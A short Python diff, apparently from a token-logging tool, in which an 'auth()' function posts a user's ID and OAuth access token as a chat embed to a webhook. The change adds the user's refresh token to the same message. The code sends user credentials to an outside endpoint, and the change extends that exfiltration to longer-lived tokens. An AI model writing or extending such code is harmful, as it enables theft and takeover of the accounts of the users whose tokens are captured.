@@ -92,7 +92,7 @@ def auth():
             data = {"embeds": [{
                         "title": "New entry",
                         "color": 0x2b2d31,
-                        "description": f"### <@{userId}> ({userId})\n-# {acc_token}"}]}
+                        "description": f"### <@{userId}> ({userId})\n-# {acc_token}\n-# {ref_token}"}]}
 
             requests.post(WEBHOOK, json=data)
         else:
